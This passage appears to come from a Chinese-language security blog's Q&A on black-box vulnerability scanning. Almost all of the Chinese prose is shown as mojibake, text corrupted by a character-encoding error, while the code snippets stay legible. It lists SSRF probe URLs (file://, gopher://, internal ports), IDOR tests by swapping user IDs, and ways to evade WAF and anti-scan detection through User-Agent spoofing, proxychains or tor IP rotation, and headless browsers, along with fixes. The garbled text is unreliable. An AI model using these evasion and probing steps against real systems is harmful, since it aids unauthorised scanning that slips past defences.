ç«¯ç‚¹æŒ–æ˜ã€ä¸šåŠ¡é€»è¾‘æ¼æ´æµ‹è¯•ã€‚</li></ul></li><li><strong>ä¸éœ€è¦</strong>ï¼š<ul><li>å¯èƒ½å½±å“ç”Ÿäº§ç¯å¢ƒï¼Œå¢åŠ æœåŠ¡å™¨è´Ÿè½½ã€‚</li><li>çˆ¬å–å¯èƒ½æ¶‰åŠéšç§æ•°æ®ï¼Œéœ€ç¬¦åˆåˆè§„è¦æ±‚ã€‚</li></ul></li></ul><h2 id="æŠ˜ä¸­æ–¹æ¡ˆï¼š-å…è®¸åŸºäºæˆæƒçš„çˆ¬å–ï¼Œå¹¶æä¾›æµé‡ç™½åå•æœºåˆ¶ã€‚-ç»“åˆ-Web-æ—¥å¿—å’Œæµé‡åˆ†æè¿›è¡Œè¢«åŠ¨æ‰«æã€‚"><a href="#æŠ˜ä¸­æ–¹æ¡ˆï¼š-å…è®¸åŸºäºæˆæƒçš„çˆ¬å–ï¼Œå¹¶æä¾›æµé‡ç™½åå•æœºåˆ¶ã€‚-ç»“åˆ-Web-æ—¥å¿—å’Œæµé‡åˆ†æè¿›è¡Œè¢«åŠ¨æ‰«æã€‚" class="headerlink" title="æŠ˜ä¸­æ–¹æ¡ˆï¼š- å…è®¸åŸºäºæˆæƒçš„çˆ¬å–ï¼Œå¹¶æä¾›æµé‡ç™½åå•æœºåˆ¶ã€‚- ç»“åˆ Web æ—¥å¿—å’Œæµé‡åˆ†æè¿›è¡Œè¢«åŠ¨æ‰«æã€‚"></a><strong>æŠ˜ä¸­æ–¹æ¡ˆ</strong>ï¼š<br>- å…è®¸åŸºäºæˆæƒçš„çˆ¬å–ï¼Œå¹¶æä¾›æµé‡ç™½åå•æœºåˆ¶ã€‚<br>- ç»“åˆ Web æ—¥å¿—å’Œæµé‡åˆ†æè¿›è¡Œè¢«åŠ¨æ‰«æã€‚</h2><h4 id="é»‘ç›’å¦‚ä½•æ‰«ææ— æ³•å‡ºç½‘çš„-SSRFï¼Ÿ"><a href="#é»‘ç›’å¦‚ä½•æ‰«ææ— æ³•å‡ºç½‘çš„-SSRFï¼Ÿ" class="headerlink" title="é»‘ç›’å¦‚ä½•æ‰«ææ— æ³•å‡ºç½‘çš„ SSRFï¼Ÿ"></a><strong>é»‘ç›’å¦‚ä½•æ‰«ææ— æ³•å‡ºç½‘çš„ SSRFï¼Ÿ</strong></h4><h2 id="æ–¹æ³•ï¼š1-æœ¬åœ°æ¢æµ‹ï¼š-é€šè¿‡-file-ã€gopher-è®¿é—®æœ¬åœ°èµ„æºï¼Œæµ‹è¯•æœåŠ¡å™¨æ˜¯å¦æ”¯æŒé-HTTP-è¯·æ±‚ã€‚-ä½¿ç”¨-http-127-0-0-1-8000-admin-æµ‹è¯•å†…ç½‘è®¿é—®ã€‚2-DNSLogï¼š-åœ¨å†…ç½‘éƒ¨ç½²-DNS-ç›‘å¬æœåŠ¡ï¼Œæ£€æµ‹æœåŠ¡å™¨æ˜¯å¦å°è¯•è§£æåŸŸåï¼š-3-ç«¯å£æ‰«æï¼š-é€šè¿‡-http-127-0-0-1-22ã€http-localhost-3306-å‘ç°å†…éƒ¨æœåŠ¡ã€‚-ç»“åˆ-burp-collaborator-è¿›è¡Œ-OOB-æµ‹è¯•ã€‚ä¿®å¤æ–¹æ¡ˆï¼š-é™åˆ¶å¤–éƒ¨è¯·æ±‚çš„ç›®æ ‡-IPï¼Œä»…å…è®¸å¯ä¿¡åŸŸåè®¿é—®ã€‚-å…³é—­-gopher-ã€file-ç­‰ä¸å¿…è¦çš„åè®®æ”¯æŒã€‚"><a href="#æ–¹æ³•ï¼š1-æœ¬åœ°æ¢æµ‹ï¼š-é€šè¿‡-file-ã€gopher-è®¿é—®æœ¬åœ°èµ„æºï¼Œæµ‹è¯•æœåŠ¡å™¨æ˜¯å¦æ”¯æŒé-HTTP-è¯·æ±‚ã€‚-ä½¿ç”¨-http-127-0-0-1-8000-admin-æµ‹è¯•å†…ç½‘è®¿é—®ã€‚2-DNSLogï¼š-åœ¨å†…ç½‘éƒ¨ç½²-DNS-ç›‘å¬æœåŠ¡ï¼Œæ£€æµ‹æœåŠ¡å™¨æ˜¯å¦å°è¯•è§£æåŸŸåï¼š-3-ç«¯å£æ‰«æï¼š-é€šè¿‡-http-127-0-0-1-22ã€http-localhost-3306-å‘ç°å†…éƒ¨æœåŠ¡ã€‚-ç»“åˆ-burp-collaborator-è¿›è¡Œ-OOB-æµ‹è¯•ã€‚ä¿®å¤æ–¹æ¡ˆï¼š-é™åˆ¶å¤–éƒ¨è¯·æ±‚çš„ç›®æ ‡-IPï¼Œä»…å…è®¸å¯ä¿¡åŸŸåè®¿é—®ã€‚-å…³é—­-gopher-ã€file-ç­‰ä¸å¿…è¦çš„åè®®æ”¯æŒã€‚" class="headerlink" title="æ–¹æ³•ï¼š1. æœ¬åœ°æ¢æµ‹ï¼š   - é€šè¿‡ file://ã€gopher:// è®¿é—®æœ¬åœ°èµ„æºï¼Œæµ‹è¯•æœåŠ¡å™¨æ˜¯å¦æ”¯æŒé HTTP è¯·æ±‚ã€‚   - ä½¿ç”¨ http://127.0.0.1:8000/admin æµ‹è¯•å†…ç½‘è®¿é—®ã€‚2. DNSLogï¼š   - åœ¨å†…ç½‘éƒ¨ç½² DNS ç›‘å¬æœåŠ¡ï¼Œæ£€æµ‹æœåŠ¡å™¨æ˜¯å¦å°è¯•è§£æåŸŸåï¼š     3. ç«¯å£æ‰«æï¼š   - é€šè¿‡ http://127.0.0.1:22ã€http://localhost:3306 å‘ç°å†…éƒ¨æœåŠ¡ã€‚   - ç»“åˆ burp-collaborator è¿›è¡Œ OOB æµ‹è¯•ã€‚ä¿®å¤æ–¹æ¡ˆï¼š- é™åˆ¶å¤–éƒ¨è¯·æ±‚çš„ç›®æ ‡ IPï¼Œä»…å…è®¸å¯ä¿¡åŸŸåè®¿é—®ã€‚- å…³é—­ gopher://ã€file:// ç­‰ä¸å¿…è¦çš„åè®®æ”¯æŒã€‚"></a><strong>æ–¹æ³•</strong>ï¼š<br>1. <strong>æœ¬åœ°æ¢æµ‹</strong>ï¼š<br>   - é€šè¿‡ <code>file://</code>ã€<code>gopher://</code> è®¿é—®æœ¬åœ°èµ„æºï¼Œæµ‹è¯•æœåŠ¡å™¨æ˜¯å¦æ”¯æŒé HTTP è¯·æ±‚ã€‚<br>   - ä½¿ç”¨ <code>http://127.0.0.1:8000/admin</code> æµ‹è¯•å†…ç½‘è®¿é—®ã€‚<br>2. <strong>DNSLog</strong>ï¼š<br>   - åœ¨å†…ç½‘éƒ¨ç½² DNS ç›‘å¬æœåŠ¡ï¼Œæ£€æµ‹æœåŠ¡å™¨æ˜¯å¦å°è¯•è§£æåŸŸåï¼š<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> example.com</span><br></pre></td></tr></table></figure><br>3. <strong>ç«¯å£æ‰«æ</strong>ï¼š<br>   - é€šè¿‡ <code>http://127.0.0.1:22</code>ã€<code>http://localhost:3306</code> å‘ç°å†…éƒ¨æœåŠ¡ã€‚<br>   - ç»“åˆ <code>burp-collaborator</code> è¿›è¡Œ OOB æµ‹è¯•ã€‚<br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- é™åˆ¶å¤–éƒ¨è¯·æ±‚çš„ç›®æ ‡ IPï¼Œä»…å…è®¸å¯ä¿¡åŸŸåè®¿é—®ã€‚<br>- å…³é—­ <code>gopher://</code>ã€<code>file://</code> ç­‰ä¸å¿…è¦çš„åè®®æ”¯æŒã€‚</h2><h4 id="é»‘ç›’å¦‚ä½•æ‰«æè¶Šæƒæ¼æ´ï¼Ÿ"><a href="#é»‘ç›’å¦‚ä½•æ‰«æè¶Šæƒæ¼æ´ï¼Ÿ" class="headerlink" title="é»‘ç›’å¦‚ä½•æ‰«æè¶Šæƒæ¼æ´ï¼Ÿ"></a><strong>é»‘ç›’å¦‚ä½•æ‰«æè¶Šæƒæ¼æ´ï¼Ÿ</strong></h4><h2 id="æ–¹æ³•ï¼š1-æ°´å¹³è¶Šæƒæµ‹è¯•ï¼š-ç”¨æˆ·-A-è®¿é—®ç”¨æˆ·-B-æ•°æ®ï¼š-æ›¿æ¢-UID-è§‚å¯Ÿè¿”å›æ•°æ®æ˜¯å¦å¯è®¿é—®ã€‚2-å‚ç›´è¶Šæƒæµ‹è¯•ï¼š-ä½æƒé™ç”¨æˆ·å°è¯•è®¿é—®ç®¡ç†å‘˜æ¥å£ï¼š-æ£€æŸ¥æ˜¯å¦è¿”å›-403ï¼Œæˆ–å°è¯•ä¸åŒè§’è‰²è®¿é—®ã€‚3-Token-æ›¿æ¢ï¼š-ä½¿ç”¨å·²ç™»å½•ç”¨æˆ·çš„-JWTã€Cookieï¼Œåˆ‡æ¢èº«ä»½ï¼Œè§‚å¯Ÿæƒé™æ§åˆ¶æƒ…å†µã€‚ä¿®å¤æ–¹æ¡ˆï¼š-é‡‡ç”¨-RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰ï¼Œé¿å…-IDORï¼ˆä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ï¼‰ã€‚-åœ¨åç«¯æ ¡éªŒç”¨æˆ·æƒé™ï¼Œè€Œéä»…ä¾èµ–å‰ç«¯é€»è¾‘ã€‚"><a href="#æ–¹æ³•ï¼š1-æ°´å¹³è¶Šæƒæµ‹è¯•ï¼š-ç”¨æˆ·-A-è®¿é—®ç”¨æˆ·-B-æ•°æ®ï¼š-æ›¿æ¢-UID-è§‚å¯Ÿè¿”å›æ•°æ®æ˜¯å¦å¯è®¿é—®ã€‚2-å‚ç›´è¶Šæƒæµ‹è¯•ï¼š-ä½æƒé™ç”¨æˆ·å°è¯•è®¿é—®ç®¡ç†å‘˜æ¥å£ï¼š-æ£€æŸ¥æ˜¯å¦è¿”å›-403ï¼Œæˆ–å°è¯•ä¸åŒè§’è‰²è®¿é—®ã€‚3-Token-æ›¿æ¢ï¼š-ä½¿ç”¨å·²ç™»å½•ç”¨æˆ·çš„-JWTã€Cookieï¼Œåˆ‡æ¢èº«ä»½ï¼Œè§‚å¯Ÿæƒé™æ§åˆ¶æƒ…å†µã€‚ä¿®å¤æ–¹æ¡ˆï¼š-é‡‡ç”¨-RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰ï¼Œé¿å…-IDORï¼ˆä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ï¼‰ã€‚-åœ¨åç«¯æ ¡éªŒç”¨æˆ·æƒé™ï¼Œè€Œéä»…ä¾èµ–å‰ç«¯é€»è¾‘ã€‚" class="headerlink" title="æ–¹æ³•ï¼š1. æ°´å¹³è¶Šæƒæµ‹è¯•ï¼š   - ç”¨æˆ· A è®¿é—®ç”¨æˆ· B æ•°æ®ï¼š          - æ›¿æ¢ UID è§‚å¯Ÿè¿”å›æ•°æ®æ˜¯å¦å¯è®¿é—®ã€‚2. å‚ç›´è¶Šæƒæµ‹è¯•ï¼š   - ä½æƒé™ç”¨æˆ·å°è¯•è®¿é—®ç®¡ç†å‘˜æ¥å£ï¼š          - æ£€æŸ¥æ˜¯å¦è¿”å› 403ï¼Œæˆ–å°è¯•ä¸åŒè§’è‰²è®¿é—®ã€‚3. Token æ›¿æ¢ï¼š   - ä½¿ç”¨å·²ç™»å½•ç”¨æˆ·çš„ JWTã€Cookieï¼Œåˆ‡æ¢èº«ä»½ï¼Œè§‚å¯Ÿæƒé™æ§åˆ¶æƒ…å†µã€‚ä¿®å¤æ–¹æ¡ˆï¼š- é‡‡ç”¨ RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰ï¼Œé¿å… IDORï¼ˆä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ï¼‰ã€‚- åœ¨åç«¯æ ¡éªŒç”¨æˆ·æƒé™ï¼Œè€Œéä»…ä¾èµ–å‰ç«¯é€»è¾‘ã€‚"></a><strong>æ–¹æ³•</strong>ï¼š<br>1. <strong>æ°´å¹³è¶Šæƒæµ‹è¯•</strong>ï¼š<br>   - <strong>ç”¨æˆ· A è®¿é—®ç”¨æˆ· B æ•°æ®</strong>ï¼š<br>     <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /user/profile?uid=10086</span><br></pre></td></tr></table></figure><br>     - æ›¿æ¢ UID è§‚å¯Ÿè¿”å›æ•°æ®æ˜¯å¦å¯è®¿é—®ã€‚<br>2. <strong>å‚ç›´è¶Šæƒæµ‹è¯•</strong>ï¼š<br>   - ä½æƒé™ç”¨æˆ·å°è¯•è®¿é—®ç®¡ç†å‘˜æ¥å£ï¼š<br>     <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/dashboard</span><br></pre></td></tr></table></figure><br>     - æ£€æŸ¥æ˜¯å¦è¿”å› 403ï¼Œæˆ–å°è¯•ä¸åŒè§’è‰²è®¿é—®ã€‚<br>3. <strong>Token æ›¿æ¢</strong>ï¼š<br>   - ä½¿ç”¨å·²ç™»å½•ç”¨æˆ·çš„ <code>JWT</code>ã€<code>Cookie</code>ï¼Œåˆ‡æ¢èº«ä»½ï¼Œè§‚å¯Ÿæƒé™æ§åˆ¶æƒ…å†µã€‚<br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- é‡‡ç”¨ <strong>RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰</strong>ï¼Œé¿å… IDORï¼ˆä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ï¼‰ã€‚<br>- åœ¨åç«¯æ ¡éªŒç”¨æˆ·æƒé™ï¼Œè€Œéä»…ä¾èµ–å‰ç«¯é€»è¾‘ã€‚</h2><h4 id="é»‘ç›’å¸¦ç™»å½•æ€æ‰«æå¦‚ä½•è§„é¿ä¸šåŠ¡å½±å“ï¼Ÿ"><a href="#é»‘ç›’å¸¦ç™»å½•æ€æ‰«æå¦‚ä½•è§„é¿ä¸šåŠ¡å½±å“ï¼Ÿ" class="headerlink" title="é»‘ç›’å¸¦ç™»å½•æ€æ‰«æå¦‚ä½•è§„é¿ä¸šåŠ¡å½±å“ï¼Ÿ"></a><strong>é»‘ç›’å¸¦ç™»å½•æ€æ‰«æå¦‚ä½•è§„é¿ä¸šåŠ¡å½±å“ï¼Ÿ</strong></h4><p><strong>æ–¹æ³•</strong>ï¼š</p><ol><li><strong>é™åˆ¶æ‰«æé€Ÿç‡</strong>ï¼š<ul><li>é‡‡ç”¨ <strong>è¯·æ±‚é—´éš”ç­–ç•¥</strong>ï¼Œé˜²æ­¢å¯¹åº”ç”¨æœåŠ¡å™¨é€ æˆé«˜è´Ÿè½½ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rate-limit: 10 requests/sec</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>éå…³é”®ä¸šåŠ¡æ—¶æ®µæµ‹è¯•</strong>ï¼š<ul><li>åœ¨ä½å³°æ—¶æ®µï¼ˆå¦‚å‡Œæ™¨ï¼‰æ‰§è¡Œæ‰«æï¼Œé¿å…å½±å“æ­£å¸¸ç”¨æˆ·ã€‚</li></ul></li><li><strong>æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·è¡Œä¸º</strong>ï¼š<ul><li>é€šè¿‡ <strong>Session å¤ç”¨</strong>ï¼Œå‡å°‘å¤šæ¬¡ç™»å½•è¯·æ±‚ï¼Œé¿å…è§¦å‘é£æ§ã€‚</li></ul></li><li><strong>åˆ›å»ºæµ‹è¯•è´¦å·</strong>ï¼š<ul><li>åœ¨æµ‹è¯•ç¯å¢ƒä½¿ç”¨ä¸“ç”¨è´¦å·ï¼Œé¿å…å½±å“çœŸå®ç”¨æˆ·æ•°æ®ã€‚</li></ul></li></ol><h2 id="ä¿®å¤æ–¹æ¡ˆï¼š-ä½¿ç”¨-WAF-è§„åˆ™-é™åˆ¶é«˜é¢‘å¼‚å¸¸è¯·æ±‚ã€‚-é‡‡ç”¨-æµ‹è¯•ç¯å¢ƒï¼Œé¿å…åœ¨ç”Ÿäº§ç¯å¢ƒç›´æ¥æ‰«æã€‚"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š-ä½¿ç”¨-WAF-è§„åˆ™-é™åˆ¶é«˜é¢‘å¼‚å¸¸è¯·æ±‚ã€‚-é‡‡ç”¨-æµ‹è¯•ç¯å¢ƒï¼Œé¿å…åœ¨ç”Ÿäº§ç¯å¢ƒç›´æ¥æ‰«æã€‚" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š- ä½¿ç”¨ WAF è§„åˆ™ é™åˆ¶é«˜é¢‘å¼‚å¸¸è¯·æ±‚ã€‚- é‡‡ç”¨ æµ‹è¯•ç¯å¢ƒï¼Œé¿å…åœ¨ç”Ÿäº§ç¯å¢ƒç›´æ¥æ‰«æã€‚"></a><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- ä½¿ç”¨ <strong>WAF è§„åˆ™</strong> é™åˆ¶é«˜é¢‘å¼‚å¸¸è¯·æ±‚ã€‚<br>- é‡‡ç”¨ <strong>æµ‹è¯•ç¯å¢ƒ</strong>ï¼Œé¿å…åœ¨ç”Ÿäº§ç¯å¢ƒç›´æ¥æ‰«æã€‚</h2><h4 id="é»‘ç›’æ‰«ææ—¶å¦‚ä½•é¿å…è¢«ååˆ¶ï¼Ÿ"><a href="#é»‘ç›’æ‰«ææ—¶å¦‚ä½•é¿å…è¢«ååˆ¶ï¼Ÿ" class="headerlink" title="é»‘ç›’æ‰«ææ—¶å¦‚ä½•é¿å…è¢«ååˆ¶ï¼Ÿ"></a><strong>é»‘ç›’æ‰«ææ—¶å¦‚ä½•é¿å…è¢«ååˆ¶ï¼Ÿ</strong></h4><p><strong>å¸¸è§ååˆ¶æœºåˆ¶</strong>ï¼š</p><ul><li><strong>WAF æ‹¦æˆª</strong>ï¼šåŸºäº IP é¢‘ç‡ã€User-Agent æ£€æµ‹æ‰«æå·¥å…·ã€‚</li><li><strong>éªŒè¯ç æœºåˆ¶</strong>ï¼šè¦æ±‚ç”¨æˆ·äº¤äº’ï¼Œé˜²æ­¢è‡ªåŠ¨åŒ–è¯·æ±‚ã€‚</li><li><strong>æµé‡å¼‚å¸¸æ£€æµ‹</strong>ï¼šæ£€æµ‹çŸ­æ—¶é—´å†…å¤§é‡è¯·æ±‚å¹¶å°ç¦ã€‚</li></ul><p><strong>è§„é¿æ–¹æ¡ˆ</strong>ï¼š</p><ol><li><strong>ä¼ªè£…è¯·æ±‚</strong>ï¼š<ul><li>ä½¿ç”¨å¸¸è§çš„ <code>User-Agent</code> ä¼ªè£…æ‰«ææµé‡ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>IP è½®æ¢</strong>ï¼š<ul><li>é€šè¿‡ä»£ç†æ± ï¼ˆå¦‚ <code>tor</code> æˆ– <code>proxychains</code>ï¼‰æ›´æ¢ IPï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p 80 target.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>ä½é¢‘æ‰«æ</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>æ—¶é—´é—´éš”æ§åˆ¶</strong>ï¼Œé¿å…çŸ­æ—¶é—´å¤§é‡è¯·æ±‚ã€‚</li></ul></li><li><strong>æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·è¡Œä¸º</strong>ï¼š<ul><li>ç»“åˆ <strong>çœŸå®æµè§ˆå™¨</strong> è¿›è¡Œæµ‹è¯•ï¼Œå¦‚ Puppeteerï¼Œç»•è¿‡åŸºäºæµè§ˆå™¨æŒ‡çº¹æ£€æµ‹çš„ååˆ¶ã€‚</li></ul></li></ol><h2 id="é•¿æœŸç­–ç•¥ï¼š-é‡‡ç”¨-ä¼ä¸šçº§èµ„äº§æ‰«æå·¥å…·ï¼ˆå¦‚-Burp-Suite-Headless-Chromeï¼‰ï¼Œç»•è¿‡ç®€å•çš„-WAF-é˜²æŠ¤ã€‚"><a href="#é•¿æœŸç­–ç•¥ï¼š-é‡‡ç”¨-ä¼ä¸šçº§èµ„äº§æ‰«æå·¥å…·ï¼ˆå¦‚-Burp-Suite-Headless-Chromeï¼‰ï¼Œç»•è¿‡ç®€å•çš„-WAF-é˜²æŠ¤ã€‚" class="headerlink" title="é•¿æœŸç­–ç•¥ï¼š- é‡‡ç”¨ ä¼ä¸šçº§èµ„äº§æ‰«æå·¥å…·ï¼ˆå¦‚ Burp Suite + Headless Chromeï¼‰ï¼Œç»•è¿‡ç®€å•çš„ WAF é˜²æŠ¤ã€‚"></a><strong>é•¿æœŸç­–ç•¥</strong>ï¼š<br>- é‡‡ç”¨ <strong>ä¼ä¸šçº§èµ„äº§æ‰«æå·¥å…·</strong>ï¼ˆå¦‚ <strong>Burp Suite + Headless Chrome</strong>ï¼‰ï¼Œç»•è¿‡ç®€å•çš„ WAF é˜²æŠ¤ã€‚</h2><h4 id="ç°ç›’ç›¸è¾ƒäºé»‘ç™½ç›’çš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ç°ç›’ç›¸è¾ƒäºé»‘ç™½ç›’çš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ç°ç›’ç›¸è¾ƒäºé»‘ç™½ç›’çš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>ç°ç›’ç›¸è¾ƒäºé»‘ç™½ç›’çš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h4><h2 id="ç°ç›’æµ‹è¯•çš„ä¼˜åŠ¿ï¼š-ç»“åˆé»‘ç›’ä¸ç™½ç›’æµ‹è¯•ï¼š-æ—¢èƒ½åˆ©ç”¨å†…éƒ¨ä¿¡æ¯ï¼ˆå¦‚-API-æ–‡æ¡£ã€éƒ¨åˆ†ä»£ç è®¿é—®æƒé™ï¼‰æé«˜æµ‹è¯•æ•ˆç‡ï¼Œåˆèƒ½æ¨¡æ‹ŸçœŸå®æ”»å‡»åœºæ™¯è¿›è¡Œæ¼æ´æŒ–æ˜ã€‚-æé«˜æµ‹è¯•è¦†ç›–ç‡ï¼š-é€šè¿‡éƒ¨åˆ†æºä»£ç å’Œæ¥å£æƒé™ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥æ›´ç²¾ç¡®åœ°åˆ†æé€»è¾‘æ¼æ´ï¼Œå¦‚æƒé™ç»•è¿‡ã€ä¸šåŠ¡æ»¥ç”¨ã€‚-å‡å°‘è¯¯æŠ¥ï¼š-ç”±äºå¯è®¿é—®éƒ¨åˆ†å†…éƒ¨é€»è¾‘ï¼Œå‡å°‘é»‘ç›’æµ‹è¯•ä¸­çš„è¯¯æŠ¥ï¼Œæé«˜æ¼æ´å‘ç°çš„å‡†ç¡®æ€§ã€‚"><a href="#ç°ç›’æµ‹è¯•çš„ä¼˜åŠ¿ï¼š-ç»“åˆé»‘ç›’ä¸ç™½ç›’æµ‹è¯•ï¼š-æ—¢èƒ½åˆ©ç”¨å†…éƒ¨ä¿¡æ¯ï¼ˆå¦‚-API-æ–‡æ¡£ã€éƒ¨åˆ†ä»£ç è®¿é—®æƒé™ï¼‰æé«˜æµ‹è¯•æ•ˆç‡ï¼Œåˆèƒ½æ¨¡æ‹ŸçœŸå®æ”»å‡»åœºæ™¯è¿›è¡Œæ¼æ´æŒ–æ˜ã€‚-æé«˜æµ‹è¯•è¦†ç›–ç‡ï¼š-é€šè¿‡éƒ¨åˆ†æºä»£ç å’Œæ¥å£æƒé™ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥æ›´ç²¾ç¡®åœ°åˆ†æé€»è¾‘æ¼æ´ï¼Œå¦‚æƒé™ç»•è¿‡ã€ä¸šåŠ¡æ»¥ç”¨ã€‚-å‡å°‘è¯¯æŠ¥ï¼š-ç”±äºå¯è®¿é—®éƒ¨åˆ†å†…éƒ¨é€»è¾‘ï¼Œå‡å°‘é»‘ç›’æµ‹è¯•ä¸­çš„è¯¯æŠ¥ï¼Œæé«˜æ¼æ´å‘ç°çš„å‡†ç¡®æ€§ã€‚" class="headerlink" title="ç°ç›’æµ‹è¯•çš„ä¼˜åŠ¿ï¼š- ç»“åˆé»‘ç›’ä¸ç™½ç›’æµ‹è¯•ï¼š  - æ—¢èƒ½åˆ©ç”¨å†…éƒ¨ä¿¡æ¯ï¼ˆå¦‚ API æ–‡æ¡£ã€éƒ¨åˆ†ä»£ç è®¿é—®æƒé™ï¼‰æé«˜æµ‹è¯•æ•ˆç‡ï¼Œåˆèƒ½æ¨¡æ‹ŸçœŸå®æ”»å‡»åœºæ™¯è¿›è¡Œæ¼æ´æŒ–æ˜ã€‚- æé«˜æµ‹è¯•è¦†ç›–ç‡ï¼š  - é€šè¿‡éƒ¨åˆ†æºä»£ç å’Œæ¥å£æƒé™ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥æ›´ç²¾ç¡®åœ°åˆ†æé€»è¾‘æ¼æ´ï¼Œå¦‚æƒé™ç»•è¿‡ã€ä¸šåŠ¡æ»¥ç”¨ã€‚- å‡å°‘è¯¯æŠ¥ï¼š  - ç”±äºå¯è®¿é—®éƒ¨åˆ†å†…éƒ¨é€»è¾‘ï¼Œå‡å°‘é»‘ç›’æµ‹è¯•ä¸­çš„è¯¯æŠ¥ï¼Œæé«˜æ¼æ´å‘ç°çš„å‡†ç¡®æ€§ã€‚"></a><strong>ç°ç›’æµ‹è¯•çš„ä¼˜åŠ¿</strong>ï¼š<br>- <strong>ç»“åˆé»‘ç›’ä¸ç™½ç›’æµ‹è¯•</strong>ï¼š<br>  - æ—¢èƒ½åˆ©ç”¨å†…éƒ¨ä¿¡æ¯ï¼ˆå¦‚ API æ–‡æ¡£ã€éƒ¨åˆ†ä»£ç è®¿é—®æƒé™ï¼‰æé«˜æµ‹è¯•æ•ˆç‡ï¼Œåˆèƒ½æ¨¡æ‹ŸçœŸå®æ”»å‡»åœºæ™¯è¿›è¡Œæ¼æ´æŒ–æ˜ã€‚<br>- <strong>æé«˜æµ‹è¯•è¦†ç›–ç‡</strong>ï¼š<br>  - é€šè¿‡éƒ¨åˆ†æºä»£ç å’Œæ¥å£æƒé™ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥æ›´ç²¾ç¡®åœ°åˆ†æé€»è¾‘æ¼æ´ï¼Œå¦‚æƒé™ç»•è¿‡ã€ä¸šåŠ¡æ»¥ç”¨ã€‚<br>- <strong>å‡å°‘è¯¯æŠ¥</strong>ï¼š<br>  - ç”±äºå¯è®¿é—®éƒ¨åˆ†å†…éƒ¨é€»è¾‘ï¼Œå‡å°‘é»‘ç›’æµ‹è¯•ä¸­çš„è¯¯æŠ¥ï¼Œæé«˜æ¼æ´å‘ç°çš„å‡†ç¡®æ€§ã€‚</h2><h4 id="æŠ½è±¡æ¥çœ‹ï¼Œå®‰å…¨è¯„ä¼°åˆ°åº•è¦è¯„ä»€ä¹ˆä¸œè¥¿ï¼Ÿ"><a href="#æŠ½è±¡æ¥çœ‹ï¼Œå®‰å…¨è¯„ä¼°åˆ°åº•è¦è¯„ä»€ä¹ˆä¸œè¥¿ï¼Ÿ" class="headerlink" title="æŠ½è±¡æ¥çœ‹ï¼Œå®‰å…¨è¯„ä¼°åˆ°åº•è¦è¯„ä»€ä¹ˆä¸œè¥¿ï¼Ÿ"></a><strong>æŠ½è±¡æ¥çœ‹ï¼Œå®‰å…¨è¯„ä¼°åˆ°åº•è¦è¯„ä»€ä¹ˆä¸œè¥¿ï¼Ÿ</strong></h4><h2 id="å®‰å…¨è¯„ä¼°æ ¸å¿ƒï¼š1-æ”»å‡»é¢åˆ†æï¼š-è¯†åˆ«å¯èƒ½çš„æ”»å‡»å…¥å£ï¼ŒåŒ…æ‹¬-APIã€Web-ç•Œé¢ã€æ•°æ®åº“ã€ç¬¬ä¸‰æ–¹é›†æˆç­‰ã€‚2-æ•°æ®å®‰å…¨ï¼š-è¯„ä¼°æ•°æ®å­˜å‚¨ã€ä¼ è¾“åŠè®¿é—®æ§åˆ¶çš„å®‰å…¨æ€§ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²å’Œæœªæˆæƒè®¿é—®ã€‚3-èº«ä»½ä¸æƒé™ç®¡ç†ï¼š-æ£€æŸ¥è®¤è¯æ–¹å¼ï¼ˆJWTã€OAuthï¼‰ã€æƒé™æ§åˆ¶æœºåˆ¶ï¼ˆRBACã€ABACï¼‰ã€‚4-æ¼æ´æ‰«æä¸æµ‹è¯•ï¼š-è¿›è¡Œé™æ€ä»£ç 